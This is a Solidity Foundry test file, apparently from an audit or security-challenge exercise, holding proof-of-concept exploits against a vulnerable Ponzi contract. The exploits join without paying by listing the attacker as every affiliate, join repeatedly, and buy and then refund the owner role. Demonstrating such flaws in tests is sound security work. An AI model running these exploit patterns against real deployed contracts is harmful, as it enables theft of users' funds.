// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";
import {PonziContract} from "../src/Ponzi.sol";
import {DeployPonzi} from "../script/DeployPonzi.s.sol";

contract PonziTest is Test {
    using console for *;

    DeployPonzi public deployerContract;
    address public deployerAddress;
    PonziContract public ponzi;
    address public immutable ATTACKER = makeAddr("attacker");

    function setUp() public {
        deployerContract = new DeployPonzi();
        (ponzi, deployerAddress) = deployerContract.run();
    }

    // this modifier will add n affiliates to the ponzi contract before running any test
    modifier withNAffiliates(uint256 n) {
        startRegistration();
        for (uint256 i = 0; i < n; i++) {
            (address[] memory currentAffiliates, uint256 affiliatesCount) = getPonziAffiliates();
            address newAffiliate = address(uint160(uint256(keccak256(abi.encodePacked(i + 1)))));
            vm.deal(newAffiliate, 1 ether * (affiliatesCount + 1));
            vm.startPrank(newAffiliate);
            ponzi.joinPonzi{value: 1 ether * affiliatesCount}(currentAffiliates);
            vm.stopPrank();
        }
        _;
    }

    // During this attack goal of attacker is to join the ponzi without paying any ether
    // to another affiliate. This is possible because the joinPonzi function does not
    // check if the provided affiliates are valid or not. So, attacker can provide
    // the list of his own address as affiliates.
    // This test should pass if attacker is able to join the ponzi without paying any ether to other affiliates.
    function testJoinPonziAttack() public withNAffiliates(10) {
        joinForFreeHelper();
    }

    // This test case demonstrates that attacker can join the ponzi multiple times
    function testJoinMultipleTimes() public withNAffiliates(10) {
        joinForFreeHelper();
        joinForFreeHelper();
        joinForFreeHelper();

        (address[] memory affiliates, uint256 affiliatesCount) = getPonziAffiliates();
        assertEq(affiliatesCount, 13, "Attacker did not join the ponzi multiple times");
        assertEq(affiliates[affiliatesCount - 1], ATTACKER, "Attacker did not join the ponzi multiple times");
        assertEq(affiliates[affiliatesCount - 2], ATTACKER, "Attacker did not join the ponzi multiple times");
        assertEq(affiliates[affiliatesCount - 3], ATTACKER, "Attacker did not join the ponzi multiple times");
    }

    // During this attack attacker can join affiliates using joinPonzi().
    // After this attacker can buy ownership role using buyOwnerRole() function
    // and then can call addNewAffilliate as many times as he wants. For each call his address will pushed to affiliates_ array
    function testOwnerBuyExploit() public {
        startRegistration();

        vm.startPrank(ATTACKER);
        ponzi.joinPonzi{value: 0}(new address[](0));
        vm.stopPrank();

        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);
        ponzi.buyOwnerRole{value: 10 ether}(ATTACKER);

        for (uint256 i = 0; i < 10; i++) {
            ponzi.addNewAffilliate(ATTACKER);
        }

        (address[] memory affiliates, uint256 affiliatesCount) = getPonziAffiliates();
        assertEq(affiliatesCount, 11, "Attacker did not join the ponzi multiple times");
        for (uint256 i = 0; i < affiliatesCount; i++) {
            assertEq(affiliates[i], ATTACKER, "Attacker did not join the ponzi multiple times");
        }
    }

    function testFreeOwnershipExploit() public {
        startRegistration();
        vm.startPrank(ATTACKER);
        ponzi.joinPonzi{value: 0}(new address[](0));
        vm.stopPrank();

        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);
        ponzi.buyOwnerRole{value: 10 ether}(ATTACKER);

        ponzi.ownerWithdraw(ATTACKER, 10 ether);
        vm.stopPrank();

        assertEq(payable(ATTACKER).balance, 10 ether, "Attacker did not get ownership for free");
    }

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    /// @dev This function is used to get the list of affiliates and affiliatesCount, used only as helper
    function getPonziAffiliates() public view returns (address[] memory affiliates, uint256 affiliatesCount) {
        affiliatesCount = ponzi.affiliatesCount();
        affiliates = new address[](affiliatesCount);
        for (uint256 i = 0; i < affiliatesCount; i++) {
            affiliates[i] = ponzi.affiliates_(i);
        }
    }

    /// @dev This function is used to join the ponzi without paying any ether to other affiliates
    function joinForFreeHelper() public {
        // deposit ether to attacker address
        (, uint256 affiliatesCount) = getPonziAffiliates();
        uint256 requiredEtherToJoin = 1 ether * affiliatesCount;
        uint256 etherToPayFee = 1 ether;
        vm.deal(ATTACKER, requiredEtherToJoin + etherToPayFee);

        // create a fake array of affiliates
        address[] memory fakeAffiliates = new address[](affiliatesCount);
        for (uint256 i = 0; i < affiliatesCount; i++) {
            fakeAffiliates[i] = ATTACKER;
        }

        uint256 attackerBalanceBefore = payable(ATTACKER).balance;
        // call joinPonzi function with fake affiliates
        vm.startPrank(ATTACKER);
        ponzi.joinPonzi{value: requiredEtherToJoin}(fakeAffiliates);
        vm.stopPrank();

        // check if attacker has joined the ponzi
        (address[] memory affiliates, uint256 newAffeliatesCount) = getPonziAffiliates();

        assertEq(newAffeliatesCount, affiliatesCount + 1, "Attacker did not join the ponzi");
        assertEq(affiliates[newAffeliatesCount - 1], ATTACKER, "Attacker did not join the ponzi");
        assertEq(payable(ATTACKER).balance, attackerBalanceBefore, "Attacker lost his money");

        console.log("Attacker balance after: %s", payable(ATTACKER).balance);
        console.log("Attacker balance before: %s", attackerBalanceBefore);
    }

    function startRegistration() private {
        vm.startPrank(deployerAddress);
        ponzi.setDeadline(block.timestamp + 1 days);
        vm.stopPrank();
    }
}
